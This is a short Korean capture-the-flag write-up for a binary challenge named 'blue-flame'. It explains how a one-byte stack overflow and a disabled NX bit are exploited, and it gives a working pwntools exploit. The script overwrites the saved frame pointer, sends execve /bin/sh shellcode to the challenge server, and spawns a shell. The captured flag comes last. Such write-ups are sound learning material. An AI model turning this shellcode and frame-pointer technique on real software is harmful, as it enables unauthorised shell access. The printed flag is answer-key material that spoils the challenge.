# 키워드
- Off by one

---
# 풀이과정

- 바이너리를 IDA로 분석해보면 `blueflame` 함수에서 1byte overflow가 발생하는 것을 알 수 있음
![[Pasted image 20240120150646.png]]

- NX bit가 없음
![[Pasted image 20240120151141.png|200]]


- 리턴주소를 완벽히 변조할 수는 없어도 마지막 한바이트는 변조할 수 있음을 이용해 주어진 stack 시작 주소로 sfp를 변경하고, stack+8 주소로 점프하게 해서 shellcode를 실행시키면 되는 문제


---
# Poc 코드

```python
from pwn import *

#p=process("./blue-flame")
#p=gdb.debug("./blue-flame")
p=remote("kknock.org", 10007)
context.log_level="debug"

shellcode=b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

p.recvline()
p.recvuntil(b'0x')
buf=int(p.recv(8),16)

nonce=(buf-4)&0xff
nonce=nonce.to_bytes(1,byteorder='little')

payload=p32(buf+4)
payload+=shellcode.rjust(0x34,b'a')
payload+=nonce

p.send(payload)

p.interactive()

# KCTF{Th15_15_r34l_f14g_h4h4}
```


